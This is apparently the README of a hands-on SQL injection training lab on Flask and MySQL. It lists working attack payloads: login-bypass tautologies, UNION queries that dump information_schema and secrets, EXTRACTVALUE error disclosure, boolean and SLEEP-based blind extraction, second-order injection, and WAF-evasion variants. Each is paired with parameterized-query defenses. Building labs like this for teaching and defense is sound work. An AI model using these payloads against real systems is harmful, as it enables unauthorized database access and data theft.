# 🛡️ SQLi-AttackLab: Hands-on SQL Injection & Defense Lab (MySQL)

[![Database](https://img.shields.io/badge/Database-MySQL%208.0-00758F.svg?style=for-the-badge&logo=mysql&logoColor=white)](https://www.mysql.com/)
[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB.svg?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Framework](https://img.shields.io/badge/Framework-Flask%203.x-000000.svg?style=for-the-badge&logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
[![Standard](https://img.shields.io/badge/Standard-OWASP%20Top%2010%20(A03%3A2021)-E0234E.svg?style=for-the-badge)](https://owasp.org/Top10/A03_2021-Injection/)
[![License](https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge)](LICENSE)

An interactive web security lab built to demonstrate and practice real-world **SQL Injection (SQLi)** attacks against **MySQL 8.0**, inspect query behavior in real time, and learn how to implement secure prepared statements.

---

## 📑 Table of Contents
- [About The Project](#-about-the-project)
- [Architecture & Flow](#-architecture--flow)
- [Lab Modules](#-lab-modules)
  - [Module 1: Authentication Bypass](#module-1-authentication-bypass)
  - [Module 2: Union-Based Injection & Schema Enumeration](#module-2-union-based-injection--schema-enumeration)
  - [Module 3: Error-Based & Blind/Time-Based Inference](#module-3-error-based--blindtime-based-inference)
  - [Module 4: Filter Evasion & Static Code Analysis](#module-4-filter-evasion--static-code-analysis)
- [Setup & Installation](#-setup--installation)
- [Database Structure](#-database-structure)
- [Attack Walkthroughs](#-attack-walkthroughs)
- [How Mitigations Work](#-how-mitigations-work)
- [Disclaimer](#-disclaimer)

---

## 🎯 About The Project

SQL Injection (SQLi) has been around for decades, but it's still one of the most common web security flaws. When user input isn't sanitized or parameterized, attackers can break out of query strings, access restricted data, bypass logins, and dump entire databases.

This project provides a local, hands-on lab environment where you can test different SQLi techniques against a real MySQL 8.0 database, view the generated queries, and toggle between vulnerable code and secure parameterized queries to see the difference.

```
                              ┌────────────────────────────────────────┐
                              │           Attacker / Client            │
                              └───────────────────┬────────────────────┘
                                                  │ HTTP POST (Payload)
                                                  ▼
                              ┌────────────────────────────────────────┐
                              │         Flask Application Engine       │
                              ├───────────────────┬────────────────────┤
                              │ Vulnerable Mode   │ Remediated Mode    │
                              │ (Dynamic String)  │ (Prepared Stmts)   │
                              └─────────┬─────────┴──────────┬─────────┘
                    Raw Interpolated SQL│                    │ Parameterized Query + Bind Vars
                                        ▼                    ▼
                              ┌────────────────────────────────────────┐
                              │            MySQL 8.0 Server            │
                              │   - Parser & AST Engine                │
                              │   - Query Execution Plan               │
                              │   - Audit Logger (`query_audit_logs`)  │
                              └────────────────────────────────────────┘
```

---

## 🏛️ Security Modules

The platform is organized into four modular vulnerability laboratories:

### Module 1: Authentication Bypass & Query Logic Manipulation
* **Tautology Injections**: Exploits delimiter escapes (`'`) and boolean logic (`OR 1=1`) to force predicates to evaluate to `TRUE`.
* **Inline Comment Truncation**: Utilizes MySQL comment markers (`-- `, `#`, `/* ... */`) to discard subsequent password verification checks.
* **Parentheses & Bracket Balancing**: Demonstrates how nested query conditions (`WHERE (user = '...') AND (pass = '...')`) require structured quote-bracket termination (`') OR ('1'='1`).
* **Live Query Inspector**: Side-by-side AST breakdown highlighting injected keywords vs. literal strings.

### Module 2: Union-Based Injection & Schema Enumeration
* **Column Count Discovery**: Algorithmic projection testing via `ORDER BY n` and `UNION SELECT NULL` vectors.
* **Reflection Point Mapping**: Locating data-type compatible fields that reflect dynamically on the client interface.
* **Metadata & Schema Dumping**: Harvesting system catalog information directly from `information_schema.tables` and `information_schema.columns`.
* **Confidential Data Exfiltration**: Targeted extraction of administrative tokens, API keys, and sensitive business entities.

### Module 3: Error-Based & Blind/Time-Based Inference
* **XPath / Error Disclosure**: Triggering deliberate syntax faults via MySQL XML functions (`EXTRACTVALUE()`, `UPDATEXML()`) to exfiltrate query output inside error messages.
* **Boolean Blind Extraction**: Algorithmic binary-search extraction using `SUBSTRING()` and `ASCII()` comparisons.
* **Time-Based Side-Channel**: Precision latency testing via `SLEEP()` and `BENCHMARK()` with millisecond visual response profiling.

### Module 4: Advanced Filter Evasion & Static Code Analysis (SAST)
* **Second-Order Injections**: Demonstrating stored payload vectors that trigger during deferred background transactions.
* **WAF & Filter Bypass**: Circumventing naive signature filters using comment-nesting (`/**/`), alternative whitespace, and URL/hex encodings.
* **Static Query Auditor (SAST)**: Developer workbench that detects unsafe dynamic string formatting and auto-converts queries to parameterized equivalents.
* **Audit Reporting**: Generates structured vulnerability assessments formatted to OWASP compliance standards.

---

## ⚡ Installation & Quickstart

### Prerequisites
* **Python 3.10+**
* **MySQL Server 8.0+** running locally (or via Docker)

### 1. Clone the Repository
```bash
git clone https://github.com/souladitya087/SQLi-AttackLab-MySQL.git
cd SQLi-AttackLab-MySQL
```

### 2. Install Python Dependencies
```bash
pip install -r requirements.txt
```

### 3. Environment Configuration
The application defaults to `root:root` on `localhost:3306`. To customize credentials, create a `.env` file:
```env
DB_HOST=127.0.0.1
DB_PORT=3306
DB_USER=root
DB_PASS=your_secure_password
DB_NAME=sqli_lab_db
SECRET_KEY=your_random_secret_key
```

### 4. Initialize Database & Seed Assets
Run the automated schema generator to provision tables, mock assets, and challenge flags:
```bash
python init_db.py
```

### 5. Launch the Security Console
```bash
python app.py
```
Open your browser at **`http://127.0.0.1:5000`** to access the dashboard.

---

## 🗄️ Database Schema Architecture

The laboratory provisions a dedicated, segregated MySQL database (`sqli_lab_db`):

| Table | Purpose | Sample Schema Columns |
| :--- | :--- | :--- |
| `users` | Primary authentication records | `id`, `username`, `password`, `role`, `email`, `api_key` |
| `products` | E-commerce catalog for UNION extraction | `id`, `name`, `category`, `price`, `stock`, `description` |
| `system_secrets` | Restricted flags and tokens for challenges | `id`, `secret_name`, `secret_value`, `classification` |
| `user_profiles` | Public profile store for Second-Order SQLi | `id`, `username`, `display_name`, `bio`, `updated_at` |
| `query_audit_logs` | Real-time security telemetry | `id`, `lab_module`, `executed_query`, `is_parameterized`, `execution_status`, `timestamp` |

---

## 🔬 Practical Exploitation Walkthroughs

### Module 1: Authentication Bypass Lab
* **Scenario 1.1: Tautology Injections (`' OR 1=1 -- `)**:
  * Injected payload breaks string literal delimiters and appends an unconditionally TRUE predicate (`OR 1=1`), forcing MySQL to return the primary administrator record.
* **Scenario 1.2: Inline Comment Truncation (`admin' -- ` or `admin' #`)**:
  * Exploits MySQL's comment syntax (`-- ` with space or `#`) to truncate the rest of the query, discarding password checks entirely.
* **Scenario 1.3: Parentheses Balancing (`') OR ('1'='1`)**:
  * Balances grouped conditions in parenthesized query structures to prevent MySQL syntax parsing faults.

### Module 2: Union-Based Injection & Schema Enumeration Lab
* **Scenario 2.1: Column Count Determination**:
  * Probe with `Hardware' ORDER BY 1 -- ` up to `Hardware' ORDER BY 5 -- ` (succeeds).
  * Incrementing to `Hardware' ORDER BY 6 -- ` triggers **MySQL Error 1054** (`Unknown column '6' in 'order clause'`), establishing that the base query projects exactly 5 columns.
* **Scenario 2.2: Data Type Reflection Mapping**:
  * Test compatibility with:
    ```sql
    ' UNION SELECT 101, 'Probe Name', 'Probe Category', 13.37, 'Probe Description' -- 
    ```
  * Identifies which fields render onto the web catalog and checks numeric vs string column casting.
* **Scenario 2.3: System & Engine Fingerprinting**:
  * Extract engine metadata using MySQL global functions:
    ```sql
    ' UNION SELECT 101, @@version, database(), 0, user() -- 
    ```
* **Scenario 2.4: Information Schema Harvesting & Exfiltration**:
  * Extract table names from MySQL's system catalog:
    ```sql
    ' UNION SELECT 101, table_name, table_schema, 0, table_type FROM information_schema.tables WHERE table_schema=database() -- 
    ```
  * Extract column definitions from target table `system_secrets`:
    ```sql
    ' UNION SELECT 101, column_name, data_type, 0, table_name FROM information_schema.columns WHERE table_name='system_secrets' -- 
    ```
  * Exfiltrate confidential credentials and harvest the challenge flag:
    ```sql
    ' UNION SELECT id, secret_name, classification, 0, secret_value FROM system_secrets -- 
    ```
  * Awards: `FLAG{mysql_information_schema_exfiltration_pwned}`.

### Module 3: Error-Based & Blind/Time-Based Inference Lab
* **Scenario 3.1: XPath Syntax Error Disclosure (`EXTRACTVALUE` / `UPDATEXML`)**:
  * Trigger MySQL Error 1105 by passing an invalid XPath expression starting with a non-XPath token (`0x7e` / `~`):
    ```sql
    admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- 
    ```
  * MySQL parses the subquery, encounters syntax error `XPATH syntax error: '~8.0.46~'`, and reflects query results inside the error message.
  * Extract confidential flag from `system_secrets` (handling MySQL's 32-character buffer truncation with `SUBSTRING()` windowing):
    ```sql
    admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT secret_value FROM system_secrets WHERE secret_name='FLAG_BLIND_EXPLOIT'), 0x7e)) -- 
    ```
* **Scenario 3.2: Boolean-Based Blind Inference Oracle**:
  * Turn the user lookup query into a True/False oracle when error output and result projections are disabled:
    ```sql
    admin' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 115 -- 
    ```
  * Predicate evaluations:
    * `TRUE`: MySQL returns the user record (1 row).
    * `FALSE`: MySQL returns empty results (0 rows).
  * Algorithmic binary search (`ASCII(...) > 100`) extracts characters in $\approx 7$ requests per character.
* **Scenario 3.3: Time-Based Side-Channel Delays (`SLEEP()` & `BENCHMARK()`)**:
  * Precision latency testing for completely blind targets where response content is completely uniform:
    ```sql
    admin' AND IF(ASCII(SUBSTRING(database(), 1, 1)) = 115, SLEEP(2), 0) -- 
    ```
  * If the condition is `TRUE`, MySQL pauses for 2 seconds (response latency $> 2000$ ms); if `FALSE`, it completes immediately ($< 50$ ms).
* **Scenario 3.4: Challenge Flag Harvest & Parameterized Defense**:
  * Exfiltrate the challenge flag: `FLAG{mysql_blind_and_error_inference_pwned}`.
  * Switch to Remediated Mode to verify how parameterized queries treat `EXTRACTVALUE(...)` and `SLEEP(...)` strictly as literal strings, neutralizing all inference channels.

### Module 4: Advanced Filter Evasion & Static Code Analysis (SAST) Lab
* **Scenario 4.1: Second-Order (Stored) SQL Injection**:
  * **First-Order Storage (Safe INSERT)**: A user registers or updates their public profile with an attack payload in the display name (e.g. `admin' -- ` or `admin' #`). The initial write operation uses prepared statements (`INSERT INTO user_profiles ... VALUES (%s, %s, %s)`), so the payload is safely stored in the database without triggering any error or alert.
  * **Second-Order Trigger (Insecure Deferred Read)**: When an administrator or background job audits or views user accounts, the application reads the stored display name from `user_profiles` and insecurely interpolates it into a secondary lookup:
    ```sql
    SELECT id, username, full_name, email, role, api_key FROM users WHERE username = '{stored_display_name}'
    ```
  * **The Exploit**: Because developers falsely assume that data already residing within MySQL is "trusted", the unescaped payload executes as active SQL code, hijacking the query and leaking admin credentials.
  * **Challenge Flag**: Unlocks `FLAG{mysql_second_order_stored_sqli_pwned}`.
  * **Defense**: Apply parameterized prepared statements to *all* database interactions, including read queries that handle previously stored values (`WHERE username = %s`).

* **Scenario 4.2: WAF & Signature Filter Evasion Sandbox**:
  * Real-world Web Application Firewalls (WAFs) rely on pattern-matching regex rules to detect common SQLi signatures. Attackers use syntax variations that MySQL accepts but regex signatures fail to catch:
    * **Whitespace Filter (`\s+`)**: Blocks space characters. Evaded by using MySQL inline comments `/**/` or tab delimiters:
      ```sql
      '/**/OR/**/'1'='1
      '/**/OR/**/1=1/**/#
      ```
    * **Strict Keyword Filter (`\b(UNION|SELECT)\b`)**: Blocks exact uppercase SQL keywords. Evaded using mixed casing or inline comment splitting:
      ```sql
      '/**/uNiOn/**/sElEcT/**/1,2,3,4,5,6/**/#
      '/**/UNI/**/ON/**/SEL/**/ECT/**/1,2,3,4,5,6/**/#
      ```
    * **Quote Stripper (`['"]`)**: Strips or blocks quotation marks. Evaded by providing string literals as MySQL hexadecimal values (e.g., `'admin'` represented as `0x61646d696e`):
      ```sql
      0x61646d696e
      ```
  * **Challenge Flag**: Evading the active WAF filter and executing valid SQL syntax awards `FLAG{mysql_waf_filter_bypass_mastered}`.
  * **Defense**: Regex filters and blocklists are fundamentally brittle. Parameterized queries enforce mathematical separation between SQL grammar and user data at the database parser level.

* **Scenario 4.3: Static Application Security Testing (SAST) Query Linter**:
  * Built-in code analyzer that inspects backend Python source code for unsafe SQL string construction patterns:
    * Python f-strings: `query = f"SELECT * FROM users WHERE id = '{user_id}'"`
    * `%` formatting operator: `query = "SELECT * FROM users WHERE email = '%s'" % email`
    * `+` string concatenation: `query = "SELECT * FROM products WHERE cat = " + cat`
    * `.format()` method calls: `query = "SELECT * FROM users WHERE user = '{}'".format(user)`
  * Pinpoints the exact line number, explains the vulnerability risk (CWE-89 / OWASP A03), and automatically produces the secure parameterized rewrite using DB-API `%s` bind variables.

* **Scenario 4.4: OWASP A03:2021 & CWE-89 Compliance Reporting**:
  * Generates an aggregated, real-time security compliance telemetry audit directly from MySQL `query_audit_logs`.
  * Computes the ratio of parameterized versus vulnerable dynamic queries across all 4 modules.
  * Formats findings according to OWASP Top 10 A03:2021 (Injection) and NIST SP 800-53 security controls.

---

## 🛡️ Mitigation Analysis: Prepared Statements

Every module features a dual-engine architecture permitting real-time comparison between vulnerable and secure implementations.

### Insecure Dynamic Concatenation (Vulnerable)
```python
# Unsafe dynamic string formatting:
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```
* **Failure Mode**: The MySQL query compiler treats user input as executable SQL syntax tokens.

### Parameterized Prepared Statements (Remediated)
```python
# Secure parameter binding:
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```
* **Defense Mechanism**: The statement template is parsed and compiled by the database server *prior* to receiving parameters. Input values are transmitted in a discrete data channel and treated strictly as literal literals, preventing syntax alteration regardless of payload complexity.

---

## 🧪 Automated Verification Suite

Run the full end-to-end automated test suite (18 integration tests covering all 4 modules):
```bash
python test_app.py
```

---

## ⚠️ Security & Ethics Disclaimer

This project is created strictly for **educational, security research, and authorized application auditing purposes**. The authors assume no liability for misuse of the techniques described herein. Always obtain explicit written authorization before conducting vulnerability assessments against third-party systems.

---

## 📜 License
This project is licensed under the [MIT License](LICENSE).
